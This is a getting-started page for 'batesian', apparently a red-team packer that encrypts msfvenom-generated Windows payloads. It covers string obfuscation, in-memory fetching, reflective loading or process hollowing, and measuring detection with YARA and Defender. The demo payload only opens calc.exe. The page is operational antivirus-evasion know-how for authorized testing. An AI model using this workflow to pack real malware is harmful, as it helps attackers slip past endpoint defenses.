# Getting started

This is the whole loop: generate a payload, write the YAML, pack it, run it and
measure the result.

!!! warning "Authorized use only"

    Pack only binaries you own or are explicitly permitted to test.

## Requirements

- **`rustc` on `PATH`** — the stub is compiled with bare `rustc`, not cargo.
  When it is missing the packer stops with instructions.
- Workspace dependencies built once (`cargo build --release` at the repo root),
  so the stub can link the `.rlib` files under `target/`.
- **x64 Windows.** On Linux/WSL the stub cross-compiles to
  `x86_64-pc-windows-gnu` (see [How it fits together](architecture.md)); to
  build with no local toolchain use the Docker workflow in the repository
  `README.md`.

## 1. Generate a payload

Any x64 PE image, DLL or raw shellcode blob works. With Metasploit's `msfvenom`:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o payload.exe   # a PE image
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin   # raw shellcode
```

Do not add an msfvenom encoder (`-e`): `batesian` encrypts the payload with
XChaCha20-Poly1305 and obfuscates the stub's strings, so an extra encoder only
makes the input larger.

## 2. Write the config

A build is one schema-4 YAML document. Strict by design: unknown keys are an
error, so a typo never silently does nothing.

=== "PE payload"

    ```yaml
    schema: 4
    name: demo

    build:
      payload:
        source: ./payload.exe
        format: pe
        crypto:
          algo: xchacha20poly1305
          key: random
      output:
        path: ./dist/demo.exe
        arch: x64
        strip: true
        trim_paths: all

    runtime:
      - technique: reflective_loading
    ```

=== "Raw shellcode"

    ```yaml
    schema: 4
    name: demo

    build:
      payload:
        source: ./payload.bin
        format: shellcode
        crypto:
          algo: xchacha20poly1305
          key: random
      output:
        path: ./dist/demo.exe
        arch: x64
        strip: true
        trim_paths: all

    runtime:
      - technique: reflective_loading
    ```

Save it as `payload.yaml`. Input and output paths are resolved relative to the
directory you run `batesian` from (the repo's examples assume the repo root).

The four blocks:

- **`build.payload`** — what to pack and how to encrypt it. `source` is a local
  path, `file://`, or an `http(s)://` URL fetched in memory.
- **`build.stub`** — optional: a custom stub template, the syscall layer and
  string obfuscation. Omitted here, so the builtin stub and the defaults apply.
- **`build.output`** — where the packed PE lands and how it is finalised.
- **`runtime`** — the techniques, in order: `0..N` Preparation followed by
  exactly one Execution.

### Choosing the format and the execution technique

| `build.payload.format` | Input | Runs with |
| --- | --- | --- |
| `pe` (default) | an x64 executable | `reflective_loading`, or `process_hollowing` |
| `dll` | an x64 library | `reflective_loading` (set `export` to call a function) |
| `shellcode` | a raw code blob | `reflective_loading` |

`reflective_loading` maps the payload into the packed binary's own process and
handles all three formats, so it is the safe default. `process_hollowing` only
runs `format: pe`, and does not yet run a full PE — see
[Process hollowing evidence](techniques/process_hollowing.md).

## 3. Build, run and measure

```bash
# Validate the config and the payload without compiling anything:
cargo run -- build payload.yaml --dry-run

# Pack it:
cargo run -- build payload.yaml
```

`-v`/`--verbose` prints the resolved config and per-step detail; the manifest
(`dist/demo.manifest.json`) records the artifact, payload and config hashes.
`batesian` prints a banner before every subcommand; `-q`/`--quiet` skips it.

```powershell
.\dist\demo.exe                       # run it
```

```bash
cargo run -- audit dist/demo.exe      # measure it
cargo run -- techniques list          # look around the registry
```

`audit` reports headers, sections and their entropy, imports/exports, a strings
scan (naming each flagged string and why it matched), YARA and (optionally) an
offline Defender scan.

## Rules worth remembering

- `schema: 4` is the only accepted version; an older document is rejected with a
  migration hint (see [Migrations](migration-v3-v4.md)).
- Unknown keys are an error.
- Exactly one Execution technique, after any Preparation techniques.
- `build.output.arch` is `x64`; `x86` is recognized but rejected as not
  integrated yet.
- Positional CLI args after the config path are substituted as `$arg.0$`,
  `$arg.1$`, … (and `name=value` as `$arg.name$`), so one config can target
  several hosts.

## Where to go next

- [Configuration](configuration.md) — every block and field, plus the wizard.
- [Examples](examples/index.md) — the runnable configs.
- [Techniques](techniques/index.md) — what each technique does and what it
  costs.
